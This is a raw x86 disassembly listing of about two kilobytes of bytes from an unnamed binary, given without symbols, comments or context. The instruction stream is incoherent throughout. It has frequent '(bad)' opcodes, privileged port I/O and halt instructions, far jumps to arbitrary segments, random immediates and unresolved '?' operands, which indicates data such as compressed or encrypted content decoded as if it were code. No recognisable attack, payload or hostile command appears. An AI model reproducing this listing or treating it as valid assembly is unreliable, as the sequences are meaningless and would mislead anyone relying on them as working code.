  4235de:	mov    esp,0xeeac9dae
  4235e3:	std    
  4235e4:	mov    bl,0x9c
  4235e6:	push   0x51
  4235e8:	sub    DWORD PTR [esi+0x64608199],esp
  4235ee:	mov    ah,0xe0
  4235f0:	inc    esi
  4235f1:	fisubr WORD PTR [edi-0x80]
  4235f4:	hlt    
  4235f5:	jmp    0xeed987fb
  4235fa:	jns    0x423600
  4235fc:	jns    0x423662
  4235fe:	pop    edx
  4235ff:	repz mov ebp,0xe749c48e
  423605:	test   eax,0xfac7df10
  42360a:	stc    
  42360b:	mov    si,0xc856
  42360f:	out    0x7a,al
  423611:	mov    dl,0x7
  423613:	add    ebp,DWORD PTR [eax-0x1c]
  423616:	dec    ebx
  423617:	je     0x4235f4
  423619:	out    0xa,eax
  42361b:	and    BYTE PTR [ecx-0x44],dl
  42361e:	push   es
  42361f:	mov    esp,0xb8f530fa
  423624:	(bad)  
  423625:	xchg   esp,eax
  423626:	(bad)  
  423627:	out    dx,eax
  423628:	fldenv [ecx+eiz*4+0x2d918a49]
  42362f:	retf   0x8112
  423632:	add    eax,0x78864199
  423637:	jo     0x4236a7
  423639:	or     dh,0x48
  42363c:	test   DWORD PTR [edx-0xb4ccbf2],eax
  423642:	push   ebx
  423643:	sub    dh,BYTE PTR [ecx+0x0]
  423646:	xor    BYTE PTR [ebp-0x6110e0c3],bh
  42364c:	out    dx,eax
  42364d:	(bad)  
  42364e:	imul   DWORD PTR [eax+0x6c]
  423651:	mov    ebx,edx
  423653:	cmp    dl,BYTE PTR [ebp-0x68]
  423656:	scas   eax,DWORD PTR es:[edi]
  423657:	push   ecx
  423658:	jno    0x4236a9
  42365a:	add    eax,0xf8a05ff6
  42365f:	ins    BYTE PTR es:[edi],dx
  423660:	jle    0x423615
  423662:	shl    ebx,cl
  423664:	adc    edi,edi
  423666:	in     al,0x42
  423668:	(bad)  
  423669:	xor    eax,0x6b6816f5
  42366e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42366f:	push   edi
  423670:	in     al,dx
  423671:	sahf   
  423672:	ins    DWORD PTR es:[edi],dx
  423673:	and    al,BYTE PTR [eax+0x38ca0bc5]
  423679:	addr16 jb 0x423671
  42367c:	and    BYTE PTR [edi],dl
  42367e:	out    0x46,al
  423680:	xchg   BYTE PTR ds:0xdea111be,ch
  423686:	inc    edi
  423687:	loopne 0x42364e
  423689:	pop    ecx
  42368a:	pushf  
  42368b:	(bad)  
  42368c:	pop    ss
  42368d:	cmc    
  42368e:	and    dl,BYTE PTR [eax+edi*8+0x2b]
  423692:	inc    esi
  423693:	cmp    al,0xd8
  423695:	dec    ebx
  423696:	push   ebx
  423697:	xlat   BYTE PTR ds:[ebx]
  423698:	popf   
  423699:	push   esi
  42369a:	xchg   BYTE PTR [edi],al
  42369c:	das    
  42369d:	ds inc ecx
  42369f:	jmp    0x28ae:0x61a80be3
  4236a6:	xor    al,0x89
  4236a8:	jmp    0x881c:0xa14f5436
  4236af:	mov    bl,0xdf
  4236b1:	adc    DWORD PTR [edi],edi
  4236b3:	popa   
  4236b4:	into   
  4236b5:	dec    esp
  4236b6:	test   eax,0xe2f113f9
  4236bb:	mov    ds:0xce5c8875,eax
  4236c0:	dec    edi
  4236c1:	cs xchg ecx,eax
  4236c3:	stos   BYTE PTR es:[edi],al
  4236c4:	div    BYTE PTR [esi]
  4236c6:	push   edi
  4236c7:	ds dec ebp
  4236c9:	xchg   edx,eax
  4236ca:	in     al,0xb8
  4236cc:	shl    dx,1
  4236cf:	mov    ah,0xcd
  4236d1:	aad    0x1e
  4236d3:	pusha  
  4236d4:	ins    DWORD PTR es:[edi],dx
  4236d5:	jmp    0x3256:0x940b0a92
  4236dc:	shr    eax,1
  4236de:	mov    al,0x42
  4236e0:	inc    eax
  4236e1:	push   ebp
  4236e2:	mov    edx,0xfa
	...
  4236ef:	add    BYTE PTR [eax],al
  4236f1:	sbb    al,0x66
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x4a093da3],dh
  423701:	sbb    eax,0xab0001af
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    BYTE PTR [ebx-0x3c],ah
  42370b:	(bad)  
  42370c:	mov    esi,0x3c854b47
  423711:	sub    esi,DWORD PTR [edi]
  423713:	and    cl,BYTE PTR fs:[ebp-0x6972f271]
  42371a:	loope  0x423750
  42371c:	mov    bl,0xe0
  42371e:	fadd   st,st(7)
  423720:	call   0xd858a53f
  423725:	xchg   ecx,eax
  423726:	loopne 0x4236f1
  423728:	jle    0x4237a6
  42372a:	and    DWORD PTR [eax],ebp
  42372c:	outs   dx,BYTE PTR ds:[esi]
  42372d:	add    esi,0xaa7ef4a2
  423733:	shl    BYTE PTR [ebx],0x60
  423736:	icebp  
  423737:	and    edx,ebx
  423739:	lods   al,BYTE PTR ds:[esi]
  42373a:	or     al,0x52
  42373c:	sub    ebx,DWORD PTR [ecx]
  42373e:	add    eax,0xcd67720f
  423743:	push   esi
  423744:	mov    ds:0xa71de529,al
  423749:	pusha  
  42374a:	cmp    DWORD PTR [edx-0x2c],ebp
  42374d:	and    al,0xc1
  42374f:	outs   dx,DWORD PTR ds:[esi]
  423750:	sbb    al,0xc0
  423752:	inc    esp
  423753:	inc    esi
  423754:	sub    al,0x15
  423756:	or     DWORD PTR [esi+edi*1+0x5366997c],eax
  42375d:	xor    DWORD PTR [ecx],esi
  42375f:	mov    WORD PTR [edx+0x2e2b8fc5],ss
  423765:	out    0x49,al
  423767:	inc    eax
  423768:	adc    edx,DWORD PTR [esi+0x3c1e9227]
  42376e:	mul    BYTE PTR [eax+0x45b1d77b]
  423774:	mov    al,ds:0x2587c815
  423779:	ins    DWORD PTR es:[edi],dx
  42377a:	jns    0x423733
  42377c:	es mov ah,bh
  42377f:	cmp    eax,0xc9bb02cc
  423784:	add    DWORD PTR [eax],edi
  423786:	jge    0x423722
  423788:	adc    BYTE PTR [edi+0x2],ah
  42378b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42378c:	mov    eax,ss:0x6894b510
  423792:	adc    ebp,DWORD PTR [edi+ebx*4-0x76]
  423796:	or     eax,0x7c669626
  42379b:	sbb    esi,DWORD PTR [eax+0x1b]
  42379e:	or     ebp,0xffffffeb
  4237a1:	cli    
  4237a2:	jmp    0xfe07:0x42144cff
  4237a9:	mov    esp,0x941ea246
  4237ae:	cs ror ecx,1
  4237b1:	fisttp QWORD PTR [ecx-0x6cfb2f8c]
  4237b7:	mov    WORD PTR [edx+0x47990a38],ss
  4237bd:	out    dx,al
  4237be:	mov    bl,0xe9
  4237c0:	jbe    0x423808
  4237c2:	iret   
  4237c3:	ret    0x4372
  4237c6:	adc    ebp,DWORD PTR [edi+0x66]
  4237c9:	(bad)  
  4237ca:	in     al,dx
  4237cb:	out    dx,eax
  4237cc:	xchg   ch,al
  4237ce:	or     eax,0xc26da681
  4237d3:	sbb    BYTE PTR [edi-0x74c97598],bh
  4237d9:	pop    ds
  4237da:	xchg   ebx,eax
  4237db:	sahf   
  4237dc:	addr16 data16 mov al,0xe3
  4237e0:	ret    0x7dc7
  4237e3:	or     eax,0x1801e031
  4237e8:	mov    ds:0xce57eae9,eax
  4237ed:	and    DWORD PTR [ebx-0x2e],ebp
  4237f0:	sub    BYTE PTR [edx],al
  4237f2:	js     0x42383a
  4237f4:	std    
  4237f5:	loopne 0x423866
  4237f7:	(bad)  
  4237f8:	out    0x43,eax
  4237fa:	push   edi
  4237fb:	mov    al,0xe1
  4237fd:	(bad)  
  4237fe:	mov    esp,0xe988251e
  423803:	add    esp,DWORD PTR [edx-0x28]
  423806:	pop    es
  423807:	jl     0x42378d
  423809:	or     ecx,DWORD PTR [esi-0xe]
  42380c:	test   DWORD PTR [esi+edx*8-0x27add559],edx
  423813:	loop   0x4237f8
  423815:	lahf   
  423816:	cdq    
  423817:	aad    0x18
  423819:	xchg   ebp,eax
  42381a:	rcr    BYTE PTR [edx],1
  42381c:	leave  
  42381d:	jno    0x4237bb
  42381f:	(bad)  
  423820:	fsub   DWORD PTR [edx-0x13e36478]
  423826:	mov    dl,0xa8
  423828:	fstp   QWORD PTR [ebx+0x2f]
  42382b:	inc    ebp
  42382c:	or     eax,0x6a740b14
  423831:	mov    bl,0xdc
  423833:	xchg   DWORD PTR [eax-0x57],esi
  423836:	leave  
  423837:	dec    esp
  423838:	fwait
  423839:	xor    eax,0x70786826
  42383e:	(bad)  
  42383f:	and    al,0x5f
  423841:	(bad)  
  423842:	fistp  WORD PTR [edi]
  423844:	mov    ah,ch
  423846:	xlat   BYTE PTR ds:[ebx]
  423847:	jmp    0x423885
  423849:	ret    
  42384a:	or     eax,0x62a9ace0
  42384f:	aam    0xc7
  423851:	xor    DWORD PTR [edi-0x13dc3e25],esp
  423857:	aad    0x4b
  423859:	mov    eax,ds:0x465a70f3
  42385e:	outs   dx,DWORD PTR ds:[esi]
  42385f:	push   eax
  423860:	xor    DWORD PTR [edx],eax
  423862:	call   0x8774d7f
  423867:	jmp    0x4f71716e
  42386c:	les    ecx,FWORD PTR [edi-0x36]
  42386f:	stc    
  423870:	fucomp st(3)
  423872:	xor    ebp,DWORD PTR [ecx-0x6f]
  423875:	push   edx
  423876:	mov    al,0xa1
  423878:	in     al,0x7a
  42387a:	dec    ebp
  42387b:	pushf  
  42387c:	jl     0x423846
  42387e:	out    dx,eax
  42387f:	pop    es
  423880:	mov    eax,?
  423882:	jae    0x42382b
  423884:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423885:	retf   0xab53
  423888:	sbb    esp,DWORD PTR [esi-0x9]
  42388b:	int    0x87
  42388d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42388e:	(bad)  
  42388f:	cmc    
  423890:	fdivr  DWORD PTR [edi+0x10413df5]
  423896:	mov    ecx,0x90ce17cb
  42389b:	cmc    
  42389c:	inc    edx
  42389d:	in     eax,0x47
  42389f:	(bad)  
  4238a1:	dec    eax
  4238a2:	add    BYTE PTR [eax+eax*4],bl
  4238a5:	or     eax,0xa2593e19
  4238aa:	lods   al,BYTE PTR ds:[esi]
  4238ab:	jno    0x4238a3
  4238ad:	leave  
  4238ae:	nop
  4238af:	cmp    BYTE PTR [edi-0x46],0x2d
  4238b3:	les    esp,FWORD PTR [esi+0x7e]
  4238b6:	dec    eax
  4238b7:	test   DWORD PTR [edx+0x7e],esi
  4238ba:	ret    
  4238bb:	sahf   
  4238bc:	aam    0xaf
  4238be:	popa   
  4238bf:	in     al,dx
  4238c0:	adc    eax,0x41938bec
  4238c5:	cmovl  esp,DWORD PTR [eax]
  4238c8:	pop    edx
  4238c9:	lds    eax,FWORD PTR [ebx+0x31]
  4238cc:	cmp    al,BYTE PTR [bx+si-0x2ace]
  4238d1:	push   esp
  4238d2:	push   esp
  4238d3:	xchg   esi,eax
  4238d4:	or     bh,BYTE PTR [ebx+0xcb71865]
  4238da:	or     dl,ah
  4238dc:	jbe    0x423892
  4238de:	(bad)  [eax+eax*8-0x38]
  4238e2:	jp     0x42390d
  4238e4:	push   ss
  4238e5:	mov    eax,ds:0xa12f2c24
  4238ea:	ins    BYTE PTR es:[edi],dx
  4238eb:	or     eax,DWORD PTR [ecx+eax*8-0x62]
  4238ef:	aam    0x62
  4238f1:	push   ds
  4238f2:	ja     0x4238cf
  4238f4:	int    0xee
  4238f6:	or     al,0x51
  4238f8:	lea    edx,[esi-0x62]
  4238fb:	xchg   ecx,eax
  4238fc:	sti    
  4238fd:	or     DWORD PTR [eax],edx
  4238ff:	loop   0x423905
  423901:	retf   0xe0f5
  423904:	stc    
  423905:	push   esp
  423906:	jnp    0x4238b8
  423908:	sbb    ebp,DWORD PTR [edx-0x64]
  42390b:	push   ebp
  42390c:	sub    dh,ah
  42390e:	adc    eax,0x12411371
  423913:	xor    eax,0x1da0ba96
  423918:	repz push ecx
  42391a:	daa    
  42391b:	pop    edx
  42391c:	adc    DWORD PTR [ebp+0x5],ecx
  42391f:	jmp    0x622c:0x1f2b0eb8
  423926:	(bad)  
  423927:	dec    ebp
  423928:	xor    eax,DWORD PTR [ebp-0x6]
  42392b:	dec    eax
  42392c:	mov    eax,0x779d4918
  423931:	mov    ch,0xbc
  423933:	adc    DWORD PTR [ebp-0x3b],ecx
  423936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423937:	push   esp
  423938:	ds and eax,0x9dd49e06
  42393e:	sub    eax,0x45a580e5
  423943:	idiv   DWORD PTR [eax-0x6e]
  423946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423947:	add    dl,BYTE PTR [ebx]
  423949:	mov    ch,BYTE PTR [ebx+0x939bf86]
  42394f:	add    DWORD PTR [ebx+esi*8+0x6c],esi
  423953:	jmp    0xd284:0xd80a998a
  42395a:	out    0xfb,eax
  42395c:	into   
  42395d:	imul   esi,DWORD PTR [edi],0xffffff89
  423960:	dec    eax
  423961:	aad    0xdd
  423963:	and    DWORD PTR [ebx-0x70],eax
  423966:	jecxz  0x4238fe
  423968:	push   ds
  423969:	repz jo 0x423905
  42396c:	jmp    0x423922
  42396e:	mov    bl,0xf0
  423970:	dec    eax
  423971:	push   eax
  423972:	xchg   ebp,eax
  423973:	pop    ebx
  423974:	fisub  WORD PTR [esi-0x72]
  423977:	fistp  DWORD PTR [ecx-0x69]
  42397a:	into   
  42397b:	or     al,0x3a
  42397d:	scas   eax,DWORD PTR es:[edi]
  42397e:	xor    al,0x83
  423980:	xor    DWORD PTR [eax+0x2b],ebx
  423983:	jl     0x4239fa
  423985:	dec    esp
  423986:	iret   
  423987:	outs   dx,DWORD PTR ds:[esi]
  423988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423989:	add    eax,0x629d3e05
  42398e:	into   
  42398f:	lahf   
  423990:	mov    al,ds:0x6e3d8082
  423995:	aas    
  423996:	sbb    ecx,esi
  423998:	mov    al,ds:0x89bb1442
  42399d:	sub    al,0x99
  42399f:	fisttp QWORD PTR [edi]
  4239a1:	sahf   
  4239a2:	in     eax,dx
  4239a3:	pop    ebp
  4239a4:	and    eax,0x633c45d1
  4239a9:	inc    edx
  4239aa:	mov    dl,0x99
  4239ac:	in     al,0xe9
  4239ae:	lock jmp 0x6e724a9e
  4239b4:	(bad)  
  4239b6:	pop    edx
  4239b7:	mov    BYTE PTR [ebx],bh
  4239b9:	pop    es
  4239ba:	mov    eax,0x80772a99
  4239bf:	out    dx,eax
  4239c0:	cmp    al,BYTE PTR [ecx]
  4239c2:	sbb    esp,esp
  4239c4:	inc    esp
  4239c5:	pop    edi
  4239c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239c7:	aad    0xf
  4239c9:	loope  0x4239f7
  4239cb:	mov    ebp,0xf5952ace
  4239d0:	daa    
  4239d1:	mov    ah,0x3
  4239d3:	jno    0x4239b7
  4239d5:	aam    0xad
  4239d7:	sub    ecx,eax
  4239d9:	jmp    0x44c7:0xbe1a727f
  4239e0:	xchg   edi,eax
  4239e1:	cld    
  4239e2:	and    BYTE PTR [esi],al
  4239e4:	or     cl,dl
  4239e6:	lods   eax,DWORD PTR ds:[esi]
  4239e7:	sbb    ebp,DWORD PTR [ebp-0x45c8cf19]
  4239ed:	popa   
  4239ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239ef:	sbb    edi,DWORD PTR [ebp+ebx*4-0x3020b08c]
  4239f6:	dec    ebp
  4239f7:	jae    0x423a3b
  4239f9:	cmc    
  4239fa:	add    BYTE PTR [edi+ecx*4-0x1f],cl
  4239fe:	xchg   esp,eax
  4239ff:	sub    ebp,DWORD PTR es:[edx]
  423a02:	xor    dl,bl
  423a04:	dec    ecx
  423a05:	pop    ebx
  423a06:	jo     0x423a0e
  423a08:	(bad)  [ebx+0x3e]
  423a0b:	push   ebp
  423a0c:	inc    esp
  423a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a0e:	sbb    edx,DWORD PTR [ecx-0x4eac37eb]
  423a14:	fcom   DWORD PTR [ebx]
  423a16:	jne    0x423a1e
  423a18:	xchg   esp,eax
  423a19:	mov    ebx,0x75ce5837
  423a1e:	xor    ebx,edx
  423a20:	cmp    al,0x83
  423a22:	push   ebx
  423a23:	mov    ds:0x90365240,al
  423a28:	mov    edi,0x5587af63
  423a2d:	(bad)  
  423a2f:	lea    ebx,[eax-0x32]
  423a32:	inc    ebx
  423a33:	fdiv   QWORD PTR [ecx+0xd]
  423a36:	and    BYTE PTR [eax+0x6f0581e1],0x39
  423a3d:	mov    cl,0x4a
  423a3f:	mov    ds:0xe62ab445,eax
  423a44:	add    esp,0xffffffd9
  423a47:	dec    eax
  423a48:	cwde   
  423a49:	cmp    dl,BYTE PTR [esi-0x26]
  423a4c:	dec    edi
  423a4d:	xchg   edx,eax
  423a4e:	test   DWORD PTR [ebx+0x11d947cb],esp
  423a54:	adc    al,dl
  423a56:	cmp    esp,DWORD PTR [ebx]
  423a58:	cmp    cl,BYTE PTR [ecx-0x6d]
  423a5b:	sub    al,ah
  423a5d:	sahf   
  423a5e:	cmc    
  423a5f:	es int 0xde
  423a62:	bound  ecx,QWORD PTR [edi+0x1dc6677e]
  423a68:	stc    
  423a69:	pop    es
  423a6a:	pop    es
  423a6b:	ja     0x423a27
  423a6d:	cdq    
  423a6e:	sti    
  423a6f:	fs xchg bh,dl
  423a72:	jnp    0x423a69
  423a74:	xor    DWORD PTR [eax+0x46f37333],ecx
  423a7a:	pop    ecx
  423a7b:	push   ebx
  423a7c:	inc    ebp
  423a7d:	(bad)  
  423a7e:	mov    ah,0x7a
  423a80:	popf   
  423a81:	cdq    
  423a82:	add    al,0xe4
  423a84:	out    0xca,eax
  423a86:	pop    ecx
  423a87:	mov    ds:0x9e8089fa,al
  423a8c:	pop    ecx
  423a8d:	int    0x91
  423a8f:	js     0x423a37
  423a91:	add    esp,DWORD PTR [edi-0x2e]
  423a94:	jns    0x423aed
  423a96:	jbe    0x423b01
  423a98:	xchg   BYTE PTR [ecx-0x48],cl
  423a9b:	mov    ah,0xb3
  423a9d:	pop    ebx
  423a9e:	mov    bh,0x43
  423aa0:	and    BYTE PTR [ebx+0x4ac9e417],bl
  423aa6:	(bad)  
  423aa7:	repz mov ch,0x27
  423aaa:	lock loop 0x423b04
  423aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423aae:	dec    ebx
  423aaf:	xchg   ebx,eax
  423ab0:	aaa    
  423ab1:	in     al,dx
  423ab2:	retf   
  423ab3:	mov    eax,ds:0x0
	...
  423ac0:	add    BYTE PTR [ecx-0x6],cl
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi+0x44],cs
  423ace:	adc    eax,0xb2c883c3
  423ad3:	add    DWORD PTR [eax],eax
  423ad5:	stos   DWORD PTR es:[edi],eax
  423ad6:	add    eax,DWORD PTR [eax]
  423ad8:	add    BYTE PTR [ecx],ch
  423ada:	and    eax,DWORD PTR [ecx]
  423adc:	stos   BYTE PTR es:[edi],al
  423add:	mov    ebp,0x55e0f19d
  423ae2:	jp     0x423a86
  423ae4:	les    ecx,FWORD PTR [ebp+0x79374922]
  423aea:	sub    ch,al
  423aec:	inc    edi
  423aed:	mov    edx,0x1f1b9ce9
  423af2:	in     al,dx
  423af3:	or     al,0x4e
  423af5:	pop    ebp
  423af6:	mov    fs,WORD PTR ds:0xd07da775
  423afc:	mov    WORD PTR [ecx],?
  423afe:	jg     0x423ae9
  423b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b01:	test   eax,0xad326b14
  423b06:	sbb    eax,0x3e6115f0
  423b0b:	mov    ds:0x7de3f15e,al
  423b10:	fidiv  DWORD PTR [esi+ebx*2+0x6fbf66c4]
  423b17:	stc    
  423b18:	sub    BYTE PTR [edi+eiz*1+0x72],0x86
  423b1d:	jl     0x423b21
  423b1f:	repnz icebp 
  423b21:	jns    0x423b96
  423b23:	mov    DWORD PTR ds:0xb880e146,ebp
  423b29:	inc    edx
  423b2a:	dec    esi
  423b2b:	mov    ah,0x4
  423b2d:	js     0x423b0c
  423b2f:	xor    BYTE PTR [eax+0xc5b7bcd],ah
  423b35:	(bad)
  423b38:	int    0x3f
  423b3a:	push   ecx
  423b3b:	and    al,0x81
  423b3d:	jno    0x423b7e
  423b3f:	mov    ds:0x24f61f83,eax
  423b44:	neg    BYTE PTR [edx*8-0x15c94e63]
  423b4b:	call   0xaf76578
  423b50:	adc    al,0x5e
  423b52:	adc    ch,BYTE PTR [edi+0x265f4536]
  423b58:	popa   
  423b59:	std    
  423b5a:	inc    ebx
  423b5b:	adc    esi,DWORD PTR [eax+0x24652541]
  423b61:	retf   0xbb1c
  423b64:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b66:	stos   DWORD PTR es:[edi],eax
  423b67:	loop   0x423b2b
  423b69:	xchg   esp,eax
  423b6a:	mov    ebp,0x420367f2
  423b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b70:	xor    eax,0xb2c6a9e6
  423b75:	jns    0x423b63
  423b77:	mov    eax,ds:0xd1e854c9
  423b7c:	cwde   
  423b7d:	mov    ecx,0x7800917
  423b82:	jle    0x423b98
  423b84:	repz imul edx,edx,0xc4183827
  423b8b:	ja     0x423b27
  423b8d:	xchg   ebp,eax
  423b8e:	mov    BYTE PTR [esi],cl
  423b90:	in     eax,dx
  423b91:	test   DWORD PTR ds:0x12aec4b3,edi
  423b97:	adc    BYTE PTR [ebp-0x2324ad9a],cl
  423b9d:	dec    BYTE PTR [ebx]
  423b9f:	pop    ecx
  423ba0:	xchg   BYTE PTR gs:[edx-0x1c],bh
  423ba4:	mov    edi,0xf1aa7570
  423ba9:	js     0x423beb
  423bab:	push   edx
  423bac:	xchg   ebx,eax
  423bad:	inc    esp
  423bae:	push   ecx
  423baf:	mov    ecx,0x8d997a4c
  423bb4:	and    al,0x6f
  423bb6:	retf   
  423bb7:	add    eax,edi
  423bb9:	les    ecx,FWORD PTR es:[ebx-0x27]
  423bbd:	in     al,dx
  423bbe:	xchg   edx,eax
  423bbf:	sub    BYTE PTR [edx],bh
  423bc1:	cmp    ecx,esi
  423bc3:	hlt    
  423bc4:	xor    bl,BYTE PTR [ebx-0x7817fa92]
  423bca:	outs   dx,DWORD PTR ds:[esi]
  423bcb:	jbe    0x423c4b
  423bcd:	jae    0x423b67
  423bcf:	(bad)  
  423bd0:	loopne 0x423bf9
  423bd2:	mov    ch,0x6e
  423bd4:	cmp    edx,DWORD PTR [edx+0x78]
  423bd7:	je     0x423bfe
  423bd9:	mov    ds:0x7644c850,al
  423bde:	jge    0x423bfb
  423be0:	and    al,0xf0
  423be2:	test   al,0x9a
  423be4:	adc    eax,DWORD PTR [ecx+0x1a]
  423be7:	add    BYTE PTR [esi+0x5739acca],0x54
  423bee:	(bad)  
  423bef:	addr16 std 
  423bf1:	xchg   esi,eax
  423bf2:	fild   QWORD PTR [ecx]
  423bf4:	mov    ds:0xbe1158c3,eax
  423bf9:	mov    al,0x99
  423bfb:	pop    es
  423bfc:	nop
  423bfd:	inc    ebx
  423bfe:	add    cl,BYTE PTR [edi-0xd]
  423c01:	dec    ecx
  423c02:	lock push esi
  423c04:	push   eax
  423c05:	mov    ebx,0x39d2b5e8
  423c0a:	xchg   ebp,eax
  423c0b:	(bad)  
  423c0c:	inc    eax
  423c0d:	pop    ds
  423c0e:	xor    BYTE PTR [eax+0x71],0x4c
  423c12:	add    eax,0x43f73ad6
  423c17:	push   edi
  423c18:	ins    BYTE PTR es:[edi],dx
  423c19:	mov    bl,0x4e
  423c1b:	mov    eax,0xe73c8572
  423c20:	inc    ebx
  423c21:	ins    DWORD PTR es:[edi],dx
  423c22:	fs inc edi
  423c24:	addr16 sub eax,0x6a222cfd
  423c2a:	sbb    bh,BYTE PTR [ebx-0x1e]
  423c2d:	popf   
  423c2e:	mov    edi,0x9886dbec
  423c33:	jmp    0x45a2:0xe522cf0
  423c3a:	sub    cl,dl
  423c3c:	dec    eax
  423c3d:	adc    BYTE PTR [edi+0x41],bl
  423c40:	adc    BYTE PTR es:[ebx+0x4e],ah
  423c44:	das    
  423c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c46:	pop    esi
  423c47:	ins    BYTE PTR es:[edi],dx
  423c48:	leave  
  423c49:	rcl    BYTE PTR [eax],0xc5
  423c4c:	inc    esi
  423c4d:	inc    esi
  423c4e:	aaa    
  423c4f:	xchg   edx,eax
  423c50:	ror    BYTE PTR [edi],1
  423c52:	fsubr  QWORD PTR [ecx]
  423c54:	xchg   ecx,eax
  423c55:	dec    esp
  423c56:	or     cl,ch
  423c58:	(bad)  
  423c59:	mov    edi,0xf2c013d9
  423c5e:	sub    edx,DWORD PTR [edx]
  423c60:	inc    ecx
  423c61:	pop    ecx
  423c62:	pop    esp
  423c63:	retf   0x3d01
  423c66:	xlat   BYTE PTR ds:[ebx]
  423c67:	cdq    
  423c68:	dec    eax
  423c69:	ss mov esi,0xba7b505f
  423c6f:	outs   dx,BYTE PTR ds:[esi]
  423c70:	arpl   WORD PTR [edi],si
  423c72:	es jle 0x423c86
  423c75:	imul   ecx,DWORD PTR [ebp+0xe],0x3c55031b
  423c7c:	jbe    0x423cf2
  423c7e:	out    0x17,al
  423c80:	imul   eax,DWORD PTR [edi+0x40c5acfb],0xf
  423c87:	int3   
  423c88:	jmp    0x423c4c
  423c8a:	xor    eax,0x7023a82a
  423c8f:	sbb    bp,sp
  423c92:	int3   
  423c93:	aas    
  423c94:	enter  0xf9,0x70
  423c98:	fidiv  DWORD PTR [edx]
  423c9a:	aaa    
  423c9b:	aad    0x61
  423c9d:	(bad)  
  423c9e:	mov    esp,0xb9a684ff
  423ca3:	pop    es
  423ca4:	dec    ebp
  423ca5:	imul   edx,DWORD PTR [ecx],0xffffff8c
  423ca8:	out    0x5f,al
  423caa:	(bad)  
  423cab:	cwde   
  423cac:	cmp    eax,edi
  423cae:	mov    ecx,DWORD PTR [ecx+0x2]
  423cb1:	xchg   esi,eax
  423cb2:	rcl    DWORD PTR [ebx+eiz*4-0x2d434d96],1
  423cb9:	or     eax,0x7c3b4722
  423cbe:	(bad)  
  423cbf:	xchg   edi,eax
  423cc0:	cli    
  423cc1:	xlat   BYTE PTR ds:[ebx]
  423cc2:	lods   eax,DWORD PTR ds:[esi]
  423cc3:	xchg   edx,eax
  423cc4:	scas   al,BYTE PTR es:[edi]
  423cc5:	es pushf 
  423cc7:	mov    ecx,esi
  423cc9:	int3   
  423cca:	mov    bl,0x9e
  423ccc:	add    eax,DWORD PTR ss:[ebx+esi*2+0x4b184f3a]
  423cd4:	xchg   edi,eax
  423cd5:	cld    
  423cd6:	adc    ch,BYTE PTR [ebx]
  423cd8:	(bad)  
  423cd9:	ja     0x423c86
  423cdb:	retf   
  423cdc:	retf   
  423cdd:	pop    ebp
  423cde:	pop    es
  423cdf:	gs sub eax,0x6545bac0
  423ce5:	imul   edx,ecx,0x11caf907
  423ceb:	sub    DWORD PTR gs:[ebx-0x72dd63b1],ebp
  423cf2:	mov    esp,0x3b2e71ce
  423cf7:	jp     0x423c95
  423cf9:	sbb    al,0xcb
  423cfb:	cwde   
  423cfc:	leave  
  423cfd:	ss stos DWORD PTR es:[edi],eax
  423cff:	je     0x423c82
  423d01:	xchg   ecx,eax
  423d02:	jle    0x423cd1
  423d04:	push   0x56
  423d06:	out    dx,al
  423d07:	adc    al,0xc2
  423d09:	jle    0x423cbb
  423d0b:	jl     0x423d0f
  423d0d:	ficomp WORD PTR cs:0xcced596b
  423d14:	mov    cl,0xc8
  423d16:	fcmovbe st,st(0)
  423d18:	mov    edx,0x74ed1fef
  423d1d:	mov    eax,ds:0xc317d798
  423d22:	and    bl,dl
  423d24:	add    eax,0x7b21e135
  423d29:	les    ebp,FWORD PTR [ebx]
  423d2b:	not    BYTE PTR [edx-0x2014ec8b]
  423d31:	popf   
  423d32:	sub    bl,BYTE PTR [ebx-0x11bc0ef6]
  423d38:	dec    ecx
  423d39:	and    edi,ebx
  423d3b:	nop
  423d3c:	(bad)  
  423d3d:	(bad)  
  423d3e:	mov    BYTE PTR [ecx],0x6
  423d41:	sbb    edx,DWORD PTR [edx-0x7]
  423d44:	cwde   
  423d45:	mov    esi,0xca53b609
  423d4a:	push   esp
  423d4b:	jb     0x423cfc
  423d4d:	sub    ebp,DWORD PTR [ecx-0x378c4864]
  423d53:	dec    ecx
  423d54:	push   es
  423d55:	push   cs
  423d56:	add    eax,0xe7dd05f3
  423d5b:	inc    edx
  423d5c:	data16 std 
  423d5e:	stc    
  423d5f:	repz mov eax,esi
  423d62:	inc    ebp
  423d63:	hlt    
  423d64:	sbb    eax,0xe5eb4512
  423d69:	add    ah,bh
  423d6b:	stos   BYTE PTR es:[edi],al
  423d6c:	inc    esp
  423d6d:	rcr    BYTE PTR [eax],0x97
  423d70:	fnsave [ebx]
  423d72:	cmp    DWORD PTR [ebx-0x22f54bf1],esp
  423d78:	xchg   ecx,eax
  423d79:	(bad)  
  423d7a:	fwait
  423d7b:	xor    DWORD PTR [edi+0x9],edi
  423d7e:	push   ds
  423d7f:	int    0xc2
  423d81:	ins    DWORD PTR es:[edi],dx
  423d82:	scas   eax,DWORD PTR es:[edi]
  423d83:	sub    al,BYTE PTR [ebx+0x36e8d515]
  423d89:	mov    WORD PTR [ebp+0x3e],fs
  423d8c:	out    dx,al
  423d8d:	dec    esp
  423d8e:	fsubr  QWORD PTR [ebp-0x6926de99]
  423d94:	dec    esi
